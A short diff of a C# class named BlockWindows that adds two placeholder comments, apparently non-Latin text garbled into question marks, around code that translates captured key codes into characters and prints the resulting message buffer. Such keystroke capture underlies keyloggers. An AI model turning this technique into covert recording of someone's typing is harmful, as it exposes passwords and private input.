@@ -370,7 +370,7 @@ class BlockWindows
                             0,
                             hKL
                         );
-
+                    //?????
                     if (Control.IsKeyLocked(Keys.CapsLock))
                     {
                      
@@ -379,6 +379,7 @@ class BlockWindows
                     if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift)
                     {
                     }
+                    //?????
                     Message.AddChar(b[0]);
                     Console.WriteLine(Message.Message);
                     Console.WriteLine(WinApi.GetAsyncKeyState(key));
